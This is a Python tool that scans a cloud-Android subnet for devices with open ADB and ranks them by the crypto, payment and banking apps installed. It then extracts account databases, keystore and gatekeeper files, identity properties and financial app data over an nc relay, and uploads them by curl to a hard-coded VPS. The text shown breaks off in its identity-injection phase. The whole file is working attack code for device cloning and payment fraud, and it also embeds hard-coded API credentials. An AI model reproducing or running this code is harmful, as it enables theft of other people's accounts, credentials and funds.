#!/usr/bin/env python3
"""
Advanced Neighbor Device Clone v3.0
====================================
Implements the full 6-phase zero-authentication device cloning workflow:

Phase 0: ESCAPE & MAP — Container escape validation + neighbor ARP scan
Phase 1: DEEP PROFILE — Identity, apps, root, accounts per neighbor → rank
Phase 2: EXTRACTION — Deep extraction from selected rooted neighbor:
   - Identity matrix (23+ props, android_id, GSF ID)
   - System databases (accounts_ce.db, accounts_de.db)
   - GSF database (gservices.db)
   - Keystore blobs (/data/misc/keystore/)
   - Gatekeeper + locksettings.db
   - App data (tapandpay.db, COIN.xml, shared_prefs, databases)
   - APKs (split APK support)
Phase 3: INJECTION — Identity → Keystore → Accounts → GSF → system_server kill
Phase 4: APP DEPLOY — APK install → UID mapping → data inject → restorecon
Phase 5: FINALIZE — iptables flush + verification + app launch

Based on: "Advanced Android Device State Cloning and Zero-Authentication
Payment Migration" research document.

Usage:
  python3 tools/advanced_neighbor_clone.py scan              # Phase 0+1
  python3 tools/advanced_neighbor_clone.py clone <IP>        # Phase 2-5 on target
  python3 tools/advanced_neighbor_clone.py auto              # Full auto (scan → pick → clone)
  python3 tools/advanced_neighbor_clone.py extract <IP>      # Phase 2 only (extract to VPS)
  python3 tools/advanced_neighbor_clone.py inject <IP>       # Phase 3-5 only (from VPS cache)
"""

import asyncio
import base64
import hashlib
import json
import os
import re
import struct
import sys
import time
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
PAD = os.environ.get("VMOS_PAD", "APP6476KYH9KMLU5")
TARGET_PAD = os.environ.get("VMOS_TARGET_PAD", "ACP2507303B6HNRI")
BASE_URL = "https://api.vmoscloud.com"
VPS_IP = os.environ.get("VMOS_VPS_IP", "37.60.234.139")
CMD_DELAY = 3.5

# Staging paths
DEVICE_STAGING = "/data/local/tmp/adv_clone"
VPS_CLONE_DIR = Path("/tmp/adv_clone")

# Identity properties to extract and inject
IDENTITY_PROPS = [
    "ro.product.model", "ro.product.brand", "ro.product.manufacturer",
    "ro.product.device", "ro.product.board", "ro.product.name",
    "ro.hardware", "ro.build.fingerprint", "ro.build.id",
    "ro.build.display.id", "ro.build.version.release",
    "ro.build.version.sdk", "ro.build.version.security_patch",
    "ro.build.type", "ro.build.flavor",
    "persist.sys.cloud.imeinum", "persist.sys.cloud.imsinum",
    "persist.sys.cloud.iccidnum", "persist.sys.cloud.phonenum",
    "persist.sys.cloud.macaddress", "persist.sys.cloud.drm.id",
    "persist.sys.cloud.gps.lat", "persist.sys.cloud.gps.lon",
]

# System databases to extract (critical for clone stability)
SYSTEM_DB_PATHS = [
    ("/data/system_de/0/accounts_de.db", "accounts_de.db"),
    ("/data/system_ce/0/accounts_ce.db", "accounts_ce.db"),
    ("/data/data/com.google.android.gsf/databases/gservices.db", "gservices.db"),
    ("/data/system/locksettings.db", "locksettings.db"),
]

# Keystore directories
KEYSTORE_PATHS = [
    "/data/misc/keystore/",
    "/data/misc/keystore2/",
]

# Gatekeeper files
GATEKEEPER_PATHS = [
    "/data/system/gatekeeper.password.key",
    "/data/system/gatekeeper.pattern.key",
]

# High-value app packages (score → selection priority)
HIGH_VALUE_APPS = {
    # Crypto (highest value)
    "io.metamask": 25, "com.wallet.crypto.trustapp": 25,
    "app.phantom": 25, "com.coinbase.android": 20,
    "com.binance.dev": 20, "piuk.blockchain.android": 18,
    "com.krakenfx.app": 18, "com.crypto.exchange": 18,
    # Payments
    "com.google.android.apps.walletnfcrel": 20,
    "com.samsung.android.spay": 15, "com.paypal.android.p2pmobile": 15,
    "com.venmo": 15, "com.squareup.cash": 15,
    "com.revolut.revolut": 15, "com.zellepay.zelle": 12,
    "com.klarna.android": 10,
    # Banking
    "com.chase.sig.android": 15, "com.wf.wellsfargo": 15,
    "com.bankofamerica.cashpro": 15, "com.capitalone.mobile": 12,
    "com.sofi.mobile": 12, "com.chime.android": 12,
    "co.mona.android": 12, "com.n26.app": 12,
    "com.starlingbank.android": 12, "com.transferwise.android": 10,
    # Social (medium value)
    "com.whatsapp": 8, "com.whatsapp.w4b": 8,
    "org.telegram.messenger": 8, "com.instagram.android": 5,
}

# App data paths to clone for financial apps
WALLET_DATA_PATHS = [
    "shared_prefs", "databases", "files", "no_backup",
]


# ═══════════════════════════════════════════════════════════════════════
# ADB WIRE PROTOCOL
# ═══════════════════════════════════════════════════════════════════════

def _cs(d): return sum(d) & 0xFFFFFFFF
def _mg(c): return struct.unpack("<I", c)[0] ^ 0xFFFFFFFF
def _pkt(c, a0, a1, d=b""):
    return struct.pack("<4sIIIII", c, a0, a1, len(d), _cs(d), _mg(c)) + d
def adb_cnxn(): return _pkt(b"CNXN", 0x01000001, 256*1024, b"host::\x00")
def adb_open(lid, svc): return _pkt(b"OPEN", lid, 0, svc.encode() + b"\x00")


# ═══════════════════════════════════════════════════════════════════════
# CLOUD BRIDGE — Rate-limited API wrapper
# ═══════════════════════════════════════════════════════════════════════

class Bridge:
    def __init__(self):
        self.client = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE_URL)
        self._last = 0.0
        self._cnxn_cache = {}
        self.our_ip = None

    async def _throttle(self):
        elapsed = time.time() - self._last
        if elapsed < CMD_DELAY:
            await asyncio.sleep(CMD_DELAY - elapsed)

    async def cmd(self, sh, t=30):
        """Execute command on OUR device, return stdout."""
        await self._throttle()
        self._last = time.time()
        try:
            r = await self.client.sync_cmd(PAD, sh, timeout_sec=t)
            d = r.get("data", [])
            if isinstance(d, list) and d:
                return (d[0].get("errorMsg", "") or "").strip()
            return ""
        except Exception as e:
            return f"ERR:{e}"

    async def fire(self, sh):
        """Fire-and-forget on our device (async_adb_cmd)."""
        await self._throttle()
        self._last = time.time()
        try:
            await self.client.async_adb_cmd([PAD], sh)
        except:
            pass

    async def _stage_cnxn(self, ip):
        """Cache ADB CNXN packet on device for neighbor relay."""
        key = ip.replace(".", "_")
        if key not in self._cnxn_cache:
            b64 = base64.b64encode(adb_cnxn()).decode()
            await self.cmd(f"echo -n '{b64}' | base64 -d > {DEVICE_STAGING}/.cnxn_{key}")
            self._cnxn_cache[key] = True

    async def nb_cmd(self, ip, shell_cmd, timeout=10):
        """Execute shell command on NEIGHBOR via ADB relay, return output."""
        await self.cmd(f"mkdir -p {DEVICE_STAGING}")
        await self._stage_cnxn(ip)

        tag = f"{hash(shell_cmd) & 0xFFFF:04x}"
        ip_key = ip.replace(".", "_")

        pkt = adb_open(1, f"shell:{shell_cmd}")
        b64 = base64.b64encode(pkt).decode()
        await self.cmd(f"echo -n '{b64}' | base64 -d > {DEVICE_STAGING}/.o{tag}")

        relay = (
            f"(cat {DEVICE_STAGING}/.cnxn_{ip_key}; sleep 0.3; "
            f"cat {DEVICE_STAGING}/.o{tag}; sleep {timeout}) | "
            f"timeout {timeout + 2} nc {ip} 5555 > {DEVICE_STAGING}/.r{tag} 2>/dev/null"
        )
        await self.fire(relay)
        await asyncio.sleep(timeout + 4)

        # Parse output: strip ADB headers
        await self.cmd(
            f"strings -n 2 {DEVICE_STAGING}/.r{tag} 2>/dev/null | "
            f"grep -v -E '^(CNXN|OKAY|WRTE|CLSE|OPEN|host::|device::)' "
            f"> {DEVICE_STAGING}/.t{tag}"
        )
        total = await self.cmd(f"wc -l < {DEVICE_STAGING}/.t{tag} 2>/dev/null || echo 0")
        try:
            n = int(total.strip())
        except:
            n = 0

        if n == 0:
            await self.cmd(f"rm -f {DEVICE_STAGING}/.o{tag} {DEVICE_STAGING}/.r{tag} {DEVICE_STAGING}/.t{tag}")
            return ""

        # Read output in chunks to avoid 2KB truncation
        chunks = []
        CHUNK = 40
        for start in range(0, n, CHUNK):
            if start == 0:
                chunk = await self.cmd(f"head -{CHUNK} {DEVICE_STAGING}/.t{tag}")
            else:
                chunk = await self.cmd(f"tail -n +{start+1} {DEVICE_STAGING}/.t{tag} | head -{CHUNK}")
            if chunk:
                chunks.append(chunk)

        await self.cmd(f"rm -f {DEVICE_STAGING}/.o{tag} {DEVICE_STAGING}/.r{tag} {DEVICE_STAGING}/.t{tag}")
        return "\n".join(chunks).strip()

    async def nb_pull_file(self, ip, remote_path, device_dest, timeout=90):
        """Pull file from neighbor to our device via nc relay."""
        port = 19870 + (hash(remote_path) & 0xFF)

        await self.cmd(f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f {device_dest}")
        await self._stage_cnxn(ip)

        shell_cmd = f"cat {remote_path} | nc -w 10 {self.our_ip} {port}"
        pkt = adb_open(1, f"shell:{shell_cmd}")
        b64 = base64.b64encode(pkt).decode()
        await self.cmd(f"echo -n '{b64}' | base64 -d > {DEVICE_STAGING}/.xfer_open")

        # Start listener on our device
        await self.fire(f"nc -l -p {port} > {device_dest}")
        await asyncio.sleep(2)

        # Fire relay
        ip_key = ip.replace(".", "_")
        relay = (
            f"(cat {DEVICE_STAGING}/.cnxn_{ip_key}; sleep 0.3; "
            f"cat {DEVICE_STAGING}/.xfer_open; sleep {timeout}) | "
            f"timeout {timeout + 5} nc {ip} 5555 > /dev/null 2>&1"
        )
        await self.fire(relay)

        # Poll for file size
        last_sz = 0
        stall_count = 0
        for wait in range(0, timeout, 10):
            await asyncio.sleep(10)
            sz = await self.cmd(f"stat -c %s {device_dest} 2>/dev/null || echo 0")
            try:
                sz_n = int(sz.strip())
            except:
                sz_n = 0
            if sz_n > 0 and sz_n == last_sz:
                stall_count += 1
                if stall_count >= 2:
                    break  # Transfer stalled, done
            else:
                stall_count = 0
            last_sz = sz_n

        await asyncio.sleep(3)
        sz = await self.cmd(f"wc -c < {device_dest} 2>/dev/null || echo 0")
        await self.cmd(f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f {DEVICE_STAGING}/.xfer_open")
        try:
            return int(sz.strip())
        except:
            return 0

    async def chunked_b64_pull(self, ip, remote_path, local_path, chunk_bytes=8192):
        """Pull file from neighbor with chunked base64 (Method 4) — SHA256 verified."""
        # Get file size
        size_out = await self.nb_cmd(ip, f"wc -c < {remote_path} 2>/dev/null || echo 0")
        try:
            total = int(size_out.strip())
        except:
            return 0, ""

        if total == 0:
            return 0, ""

        # Get hash
        hash_out = await self.nb_cmd(ip, f"sha256sum {remote_path} 2>/dev/null | head -1")
        expected_hash = (hash_out.split()[0] if hash_out else "").strip()

        print(f"      Pulling {remote_path} ({total} bytes, hash={expected_hash[:12]}...)")

        chunks = []
        offset = 0
        while offset < total:
            remaining = min(chunk_bytes, total - offset)
            cmd = f"dd if={remote_path} bs=1 skip={offset} count={remaining} 2>/dev/null | base64 -w 0"
            b64_output = await self.nb_cmd(ip, cmd, timeout=8)

            if not b64_output:
                print(f"      WARN: empty chunk at offset {offset}")
                offset += remaining
                continue

            # Strip ADB header contamination
            cleaned = re.sub(r'[^A-Za-z0-9+/=]', '', b64_output)
            for hdr in ['WRTE', 'OKAY', 'CLSE', 'CNXN', 'OPEN']:
                cleaned = cleaned.replace(hdr, '')

            try:
                chunk = base64.b64decode(cleaned)
                chunks.append(chunk)
            except Exception as e:
                print(f"      WARN: decode error at offset {offset}: {e}")

            offset += remaining
            if offset % (chunk_bytes * 10) == 0:
                print(f"      {offset}/{total} ({100*offset//total}%)")

        full_data = b''.join(chunks)
        actual_hash = hashlib.sha256(full_data).hexdigest()

        VPS_CLONE_DIR.mkdir(parents=True, exist_ok=True)
        dest = VPS_CLONE_DIR / local_path
        dest.parent.mkdir(parents=True, exist_ok=True)
        with open(dest, 'wb') as f:
            f.write(full_data)

        match = actual_hash == expected_hash if expected_hash else "unknown"
        print(f"      Saved {len(full_data)} bytes → {dest} (hash_match={match})")
        return len(full_data), actual_hash

    async def push_b64_file(self, local_path, device_path, chunk_size=800):
        """Push file TO our device using base64 chunk injection."""
        with open(local_path, 'rb') as f:
            data = f.read()

        b64 = base64.b64encode(data).decode()

        # Clear target
        await self.cmd(f"rm -f {device_path} {device_path}.b64")

        # Push in chunks
        for i in range(0, len(b64), chunk_size):
            chunk = b64[i:i+chunk_size]
            op = '>' if i == 0 else '>>'
            await self.cmd(f"echo -n '{chunk}' {op} {device_path}.b64")

        # Decode
        await self.cmd(f"base64 -d {device_path}.b64 > {device_path} && rm -f {device_path}.b64")

        # Verify size
        sz = await self.cmd(f"wc -c < {device_path} 2>/dev/null || echo 0")
        try:
            return int(sz.strip())
        except:
            return 0


# ═══════════════════════════════════════════════════════════════════════
# PHASE 0: ESCAPE VALIDATION & ENVIRONMENT
# ═══════════════════════════════════════════════════════════════════════

async def phase0_escape(b: Bridge) -> dict:
    """Validate container escape context and map environment."""
    print("\n" + "="*70)
    print("  PHASE 0: CONTAINER ESCAPE VALIDATION & ENVIRONMENT MAPPING")
    print("="*70)

    env = {}

    # Get our IP
    out = await b.cmd("ip addr show eth0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
    b.our_ip = out.strip()
    env["our_ip"] = b.our_ip
    print(f"  Our IP: {b.our_ip}")

    # Root context
    out = await b.cmd("id")
    env["uid"] = out.strip()
    is_root = "uid=0" in out
    print(f"  UID: {out.strip()}")

    # Namespace analysis
    out = await b.cmd(
        "readlink /proc/1/ns/pid; echo '|'; "
        "readlink /proc/1/ns/mnt; echo '|'; "
        "readlink /proc/1/ns/net"
    )
    env["namespaces"] = out.strip()
    print(f"  Namespaces: {out.strip()}")

    # SELinux
    out = await b.cmd("getenforce 2>/dev/null || echo disabled")
    env["selinux"] = out.strip()
    print(f"  SELinux: {out.strip()}")

    # Keystore type (critical — software-backed = cloneable)
    out = await b.cmd("ls -la /data/misc/keystore/ 2>/dev/null")
    env["keystore_files"] = out.strip()
    has_persistent = "persistent.sqlite" in (out or "")
    print(f"  Keystore: {'SOFTWARE-BACKED (cloneable!)' if has_persistent else 'hardware-backed'}")

    # Keystore2 check
    out2 = await b.cmd("ls -la /data/misc/keystore2/ 2>/dev/null | head -5")
    env["keystore2_files"] = out2.strip()
    if out2.strip():
        print(f"  Keystore2: {out2.strip()[:100]}")

    # iptables check for payment blocking
    out = await b.cmd("iptables -L OUTPUT -n 2>/dev/null | grep -i 'payments\\|google\\|bm' | head -5")
    env["iptables_blocks"] = out.strip()
    if out.strip():
        print(f"  iptables blocks: {out.strip()}")
    else:
        print(f"  iptables: no payment blocks detected")

    env["escape_ready"] = is_root and has_persistent
    print(f"\n  {'✓' if env['escape_ready'] else '✗'} Escape context: "
          f"{'OPTIMAL (root + software keystore)' if env['escape_ready'] else 'DEGRADED'}")

    return env


# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: NEIGHBOR DISCOVERY & DEEP PROFILING
# ═══════════════════════════════════════════════════════════════════════

async def phase1_scan(b: Bridge, max_probe=30) -> list:
    """Discover and profile ADB neighbors, rank by clone value."""
    print("\n" + "="*70)
    print("  PHASE 1: NEIGHBOR DISCOVERY & DEEP PROFILING")
    print("="*70)

    subnet = ".".join(b.our_ip.split(".")[:3])

    # Write and launch scan script
    scan_sh = f"""#!/system/bin/sh
rm -f {DEVICE_STAGING}/adb_hosts.txt
for i in $(seq 1 254); do
    IP="{subnet}.$i"
    [ "$IP" = "{b.our_ip}" ] && continue
    (echo Q | timeout 2 nc -w 1 $IP 5555 >/dev/null 2>&1 && echo $IP >> {DEVICE_STAGING}/adb_hosts.txt) &
    [ $((i % 50)) -eq 0 ] && wait
done
wait
echo SCAN_DONE >> {DEVICE_STAGING}/adb_hosts.txt
"""
    b64 = base64.b64encode(scan_sh.encode()).decode()
    await b.cmd(f"mkdir -p {DEVICE_STAGING}")
    await b.cmd(f"echo '{b64}' | base64 -d > {DEVICE_STAGING}/scan.sh && chmod 755 {DEVICE_STAGING}/scan.sh")
    await b.fire(f"nohup sh {DEVICE_STAGING}/scan.sh > /dev/null 2>&1 &")

    print(f"  Scanning {subnet}.1-254 for ADB port 5555...")

    # Poll
    hosts = []
    for i in range(25):
        await asyncio.sleep(8)
        log = await b.cmd(f"cat {DEVICE_STAGING}/adb_hosts.txt 2>/dev/null || echo NOLOG")
        hosts = [l.strip() for l in (log or "").split("\n")
                 if l.strip() and l.strip() not in ("SCAN_DONE", "NOLOG")]
        done = "SCAN_DONE" in (log or "")
        if i % 3 == 0:
            print(f"    [{(i+1)*8}s] {len(hosts)} hosts {'(DONE)' if done else '...'}")
        if done:
            break

    print(f"\n  Found {len(hosts)} ADB-open neighbors")

    # Deep profile top N
    probe_list = hosts[:max_probe]
    print(f"  Profiling top {len(probe_list)} neighbors...")

    profiles = []
    for idx, ip in enumerate(probe_list):
        info = await _profile_neighbor(b, ip)
        if info["status"] != "alive":
            continue

        # Calculate clone value score
        score = 0
        for app in info.get("apps", []):
            score += HIGH_VALUE_APPS.get(app, 0)
        if info.get("root"):
            score += 50  # Root access is critical for deep clone
        info["score"] = score

        tags = []
        if info.get("root"): tags.append("ROOT")
        if any(a in info.get("apps", []) for a in ["com.google.android.apps.walletnfcrel"]): tags.append("WALLET")
        if any(a in info.get("apps", []) for a in ["com.whatsapp", "com.whatsapp.w4b"]): tags.append("WA")
        if any(a in info.get("apps", []) for a in ["io.metamask", "com.wallet.crypto.trustapp"]): tags.append("CRYPTO")
        if any(a in info.get("apps", []) for a in ["com.revolut.revolut", "com.paypal.android.p2pmobile"]): tags.append("FINTECH")

        tag_str = " ".join(tags)
        print(f"    [{idx+1}/{len(probe_list)}] {ip}: {info.get('brand','')} {info.get('model','')} | "
              f"Apps={info.get('app_count',0)} | Score={score} | Accts={info.get('acct_count',0)} | "
              f"{'ROOT' if info.get('root') else 'shell'} [{tag_str}]")

        profiles.append(info)

    # Sort by score descending
    profiles.sort(key=lambda x: x["score"], reverse=True)

    # Save scan results
    VPS_CLONE_DIR.mkdir(parents=True, exist_ok=True)
    with open(VPS_CLONE_DIR / "scan_results.json", "w") as f:
        json.dump(profiles, f, indent=2, default=str)

    print(f"\n  Top targets (by clone value):")
    for p in profiles[:10]:
        hv = [a for a in p.get("apps", []) if a in HIGH_VALUE_APPS]
        print(f"    {p['ip']}: Score={p['score']} | {p.get('brand','')} {p.get('model','')} | "
              f"{'ROOT' if p.get('root') else 'shell'} | HV: {', '.join(hv[:5])}")

    return profiles


async def _profile_neighbor(b: Bridge, ip: str) -> dict:
    """Deep profile a single neighbor."""
    compound = (
        "echo ===ID===; "
        "getprop ro.product.model; getprop ro.product.brand; "
        "getprop ro.build.version.release; getprop ro.build.version.sdk; "
        "echo ===SHELL===; id | head -1; "
        "echo ===APPS===; pm list packages -3 2>/dev/null; "
        "echo ===SYSAPPS===; pm list packages -s 2>/dev/null | "
        "grep -E 'wallet|pay|bank|crypto|metamask|trust|coinbase' | head -10; "
        "echo ===ACC===; dumpsys account 2>/dev/null | grep -c 'Account {' 2>/dev/null; "
        "echo ===GSFA===; dumpsys account 2>/dev/null | grep 'Account {' | head -5; "
        "echo ===END==="
    )

    out = await b.nb_cmd(ip, compound, timeout=12)

    if not out or "===ID===" not in out:
        return {"ip": ip, "status": "unreachable"}

    lines = out.split("\n")
    model = brand = android_ver = sdk = shell = ""
    apps = []
    sys_apps = []
    acct_count = 0
    acct_list = []
    section = ""

    for line in lines:
        line = line.strip()
        if "===ID===" in line: section = "id"; continue
        if "===SHELL===" in line: section = "shell"; continue
        if "===APPS===" in line: section = "apps"; continue
        if "===SYSAPPS===" in line: section = "sysapps"; continue
        if "===ACC===" in line: section = "acc"; continue
        if "===GSFA===" in line: section = "gsfa"; continue
        if "===END===" in line: break

        if section == "id":
            if not model: model = line
            elif not brand: brand = line
            elif not android_ver: android_ver = line
            elif not sdk: sdk = line
        elif section == "shell":
            shell = line
        elif section == "apps":
            if line.startswith("package:"):
                apps.append(line.replace("package:", ""))
        elif section == "sysapps":
            if line.startswith("package:"):
                sys_apps.append(line.replace("package:", ""))
        elif section == "acc":
            try: acct_count = int(line)
            except: pass
        elif section == "gsfa":
            if "Account {" in line:
                acct_list.append(line.strip())

    is_root = "uid=0" in shell

    return {
        "ip": ip,
        "status": "alive",
        "model": model, "brand": brand,
        "android_version": android_ver, "sdk": sdk,
        "root": is_root,
        "shell_context": shell,
        "apps": apps,
        "sys_finance_apps": sys_apps,
        "app_count": len(apps),
        "acct_count": acct_count,
        "acct_list": acct_list,
    }


# ═══════════════════════════════════════════════════════════════════════
# PHASE 2: DEEP EXTRACTION FROM SELECTED NEIGHBOR
# ═══════════════════════════════════════════════════════════════════════

async def phase2_extract(b: Bridge, ip: str) -> dict:
    """Deep extraction: identity + system DBs + keystore + app data + APKs."""
    print("\n" + "="*70)
    print(f"  PHASE 2: DEEP EXTRACTION FROM {ip}")
    print("="*70)

    manifest = {
        "source_ip": ip,
        "timestamp": datetime.now().isoformat(),
        "our_pad": PAD,
        "extraction": {}
    }

    # ─── 2a: Identity Matrix ───
    print("\n  [2a] Extracting identity matrix (23+ properties)...")
    identity = {}

    # Batch getprop in groups of 5
    for i in range(0, len(IDENTITY_PROPS), 5):
        batch = IDENTITY_PROPS[i:i+5]
        cmd = "; ".join([f"echo PROP:{p}:$(getprop {p})" for p in batch])
        out = await b.nb_cmd(ip, cmd, timeout=8)
        for line in (out or "").split("\n"):
            if line.startswith("PROP:"):
                parts = line.split(":", 2)
                if len(parts) >= 3:
                    identity[parts[1]] = parts[2].strip()

    # Get android_id
    out = await b.nb_cmd(ip, "settings get secure android_id", timeout=8)
    identity["android_id"] = (out or "").strip()

    print(f"    Extracted {len(identity)} identity properties")
    print(f"    Model: {identity.get('ro.product.model', '?')}")
    print(f"    Brand: {identity.get('ro.product.brand', '?')}")
    print(f"    Fingerprint: {identity.get('ro.build.fingerprint', '?')[:60]}...")
    print(f"    Android ID: {identity.get('android_id', '?')}")

    manifest["identity"] = identity

    # Save identity
    VPS_CLONE_DIR.mkdir(parents=True, exist_ok=True)
    ip_dir = VPS_CLONE_DIR / ip.replace(".", "_")
    ip_dir.mkdir(parents=True, exist_ok=True)
    with open(ip_dir / "identity.json", "w") as f:
        json.dump(identity, f, indent=2)

    # ─── 2b: GSF ID (critical for GMS session continuity) ───
    print("\n  [2b] Extracting GSF ID...")
    gsf_out = await b.nb_cmd(ip,
        "sqlite3 /data/data/com.google.android.gsf/databases/gservices.db "
        "\"select value from main where name='android_id';\" 2>/dev/null || echo GSF_FAIL",
        timeout=8
    )
    gsf_id = (gsf_out or "").strip()
    if gsf_id and gsf_id != "GSF_FAIL":
        identity["gsf_id"] = gsf_id
        print(f"    GSF ID: {gsf_id}")
    else:
        print(f"    GSF ID extraction failed (sqlite3 may not be available)")
        # Fallback: pull gservices.db raw
        gsf_id = None

    # ─── 2c: System databases (accounts, GSF, locksettings) ───
    print("\n  [2c] Extracting system databases (accounts, GSF, locksettings)...")
    extracted_dbs = {}

    for remote_path, local_name in SYSTEM_DB_PATHS:
        print(f"    Extracting {local_name}...")
        sz, h = await b.chunked_b64_pull(
            ip, remote_path,
            f"{ip.replace('.','_')}/{local_name}",
            chunk_bytes=8192
        )
        if sz > 0:
            extracted_dbs[local_name] = {"size": sz, "hash": h}
            print(f"    ✓ {local_name}: {sz} bytes")
        else:
            print(f"    ✗ {local_name}: extraction failed (permissions?)")

    manifest["extraction"]["system_dbs"] = extracted_dbs

    # ─── 2d: Keystore blobs ───
    print("\n  [2d] Extracting keystore blobs...")
    keystore_files = {}

    for ks_dir in KEYSTORE_PATHS:
        ls_out = await b.nb_cmd(ip, f"find {ks_dir} -type f 2>/dev/null | head -20", timeout=8)
        if not ls_out or "No such" in ls_out:
            continue

        for fpath in ls_out.split("\n"):
            fpath = fpath.strip()
            if not fpath or not fpath.startswith("/"):
                continue
            fname = fpath.replace("/", "_").lstrip("_")
            sz, h = await b.chunked_b64_pull(
                ip, fpath,
                f"{ip.replace('.','_')}/keystore/{fname}",
                chunk_bytes=4096
            )
            if sz > 0:
                keystore_files[fpath] = {"size": sz, "hash": h, "local": fname}

    print(f"    Extracted {len(keystore_files)} keystore files")
    manifest["extraction"]["keystore"] = keystore_files

    # ─── 2e: Gatekeeper state ───
    print("\n  [2e] Extracting gatekeeper state...")
    gatekeeper_files = {}
    for gk_path in GATEKEEPER_PATHS:
        exists = await b.nb_cmd(ip, f"test -f {gk_path} && echo YES || echo NO", timeout=5)
        if "YES" in (exists or ""):
            fname = gk_path.split("/")[-1]
            sz, h = await b.chunked_b64_pull(
                ip, gk_path,
                f"{ip.replace('.','_')}/gatekeeper/{fname}",
                chunk_bytes=4096
            )
            if sz > 0:
                gatekeeper_files[gk_path] = {"size": sz, "hash": h}

    # Also grab spblob directory
    spblob_out = await b.nb_cmd(ip, "find /data/system_de/0/spblob/ -type f 2>/dev/null | head -10", timeout=8)
    for fpath in (spblob_out or "").split("\n"):
        fpath = fpath.strip()
        if fpath and fpath.startswith("/"):
            fname = fpath.split("/")[-1]
            sz, h = await b.chunked_b64_pull(
                ip, fpath,
                f"{ip.replace('.','_')}/spblob/{fname}",
                chunk_bytes=4096
            )
            if sz > 0:
                gatekeeper_files[fpath] = {"size": sz, "hash": h}

    print(f"    Extracted {len(gatekeeper_files)} gatekeeper/spblob files")
    manifest["extraction"]["gatekeeper"] = gatekeeper_files

    # ─── 2f: Financial app data ───
    print("\n  [2f] Extracting financial app data...")
    app_data = {}

    # Get list of installed financial apps
    hv_check = await b.nb_cmd(ip,
        "pm list packages 2>/dev/null | grep -E '"
        + "|".join(list(HIGH_VALUE_APPS.keys())[:20]).replace(".", "\\.")
        + "'",
        timeout=10
    )
    installed_hv = []
    for line in (hv_check or "").split("\n"):
        if line.startswith("package:"):
            installed_hv.append(line.replace("package:", "").strip())

    print(f"    Found {len(installed_hv)} high-value apps on neighbor")

    for pkg in installed_hv[:5]:  # Limit to top 5 to manage time
        print(f"\n    --- {pkg} ---")

        # Force stop to flush WAL
        await b.nb_cmd(ip, f"am force-stop {pkg}", timeout=5)

        # Get APK paths (for Phase 4)
        apk_out = await b.nb_cmd(ip, f"pm path {pkg} 2>/dev/null", timeout=8)
        apk_paths = []
        for line in (apk_out or "").split("\n"):
            if line.startswith("package:"):
                apk_paths.append(line.replace("package:", "").strip())

        # Archive app data (databases + shared_prefs + files + no_backup)
        tar_path_nb = f"/data/local/tmp/.clone_{pkg.replace('.', '_')}.tar.gz"
        dirs_to_tar = " ".join([f"/data/data/{pkg}/{d}" for d in WALLET_DATA_PATHS])
        tar_out = await b.nb_cmd(ip,
            f"tar czf {tar_path_nb} {dirs_to_tar} 2>/dev/null; "
            f"wc -c < {tar_path_nb} 2>/dev/null || echo 0",
            timeout=20
        )
        tar_size = 0
        for line in (tar_out or "").split("\n"):
            if line.strip().isdigit():
                tar_size = int(line.strip())

        if tar_size > 0:
            print(f"      App data: {tar_size/1024:.0f}KB")
            # Pull tar to our device then to VPS via upload
            device_tar = f"{DEVICE_STAGING}/clone_{pkg.replace('.', '_')}.tar.gz"
            pulled = await b.nb_pull_file(ip, tar_path_nb, device_tar, timeout=60)
            if pulled > 0:
                # Upload to VPS via curl -T
                vps_dest = f"{ip.replace('.','_')}/appdata/{pkg}.tar.gz"
                await b.cmd(
                    f"curl -s -T {device_tar} http://{VPS_IP}:19000/{vps_dest}"
                )
                print(f"      ✓ App data uploaded ({pulled} bytes)")
                app_data[pkg] = {
                    "tar_size": tar_size,
                    "pulled": pulled,
                    "apk_paths": apk_paths,
                }
            await b.cmd(f"rm -f {device_tar}")
        else:
            print(f"      No data (permissions?)")
            app_data[pkg] = {"apk_paths": apk_paths, "tar_size": 0}

        # Clean up on neighbor
        await b.nb_cmd(ip, f"rm -f {tar_path_nb}", timeout=5)

    manifest["extraction"]["app_data"] = app_data

    # ─── 2g: APK extraction for key apps ───
    print("\n  [2g] Extracting APKs for financial apps...")
    apk_manifest = {}

    for pkg, info in app_data.items():
        apk_paths = info.get("apk_paths", [])
        if not apk_paths:
            continue

        print(f"    Pulling APKs for {pkg} ({len(apk_paths)} splits)...")
        pkg_apks = []

        for apk_path in apk_paths:
            fname = apk_path.split("/")[-1]
            device_dest = f"{DEVICE_STAGING}/{pkg}_{fname}"

            pulled = await b.nb_pull_file(ip, apk_path, device_dest, timeout=120)
            if pulled > 0:
                # Upload to VPS
                vps_dest = f"{ip.replace('.','_')}/apks/{pkg}_{fname}"
                await b.cmd(f"curl -s -T {device_dest} http://{VPS_IP}:19000/{vps_dest}")
                pkg_apks.append({"path": apk_path, "name": fname, "size": pulled})
                print(f"      ✓ {fname}: {pulled/1024:.0f}KB")
            await b.cmd(f"rm -f {device_dest}")

        apk_manifest[pkg] = pkg_apks

    manifest["extraction"]["apks"] = apk_manifest

    # Save manifest
    with open(ip_dir / "extraction_manifest.json", "w") as f:
        json.dump(manifest, f, indent=2, default=str)

    print(f"\n  Phase 2 complete. Extraction manifest saved.")
    return manifest


# ═══════════════════════════════════════════════════════════════════════
# PHASE 3: IDENTITY + CRYPTOGRAPHIC INJECTION
# ═══════════════════════════════════════════════════════════════════════

async def phase3_inject_system(b: Bridge, ip: str) -> bool:
    """Inject identity, keystore, accounts, GSF into our device."""
    print("\n" + "="*70)
    print(f"  PHASE 3: SYSTEM INJECTION (identity + crypto + accounts)")
    print("="*70)

    ip_dir = VPS_CLONE_DIR / ip.replace(".", "_")
    if not ip_dir.exists():
        print(f"  ERROR: No extraction data at {ip_dir}")
        return False

    # Load identity
    id_file = ip_dir / "identity.json"
    if not id_file.exists():
        print(f"  ERROR: No identity.json found")
        return False

    with open(id_file) as f:
        identity = json.load(f)

    # ─── 3a: Identity injection ───
    print("\n  [3a] Injecting identity matrix...")
    injected = 0
    for prop, val in identity.items():
        if prop.startswith("ro.") or prop.startswith("persist.sys.cloud."):
            if val:
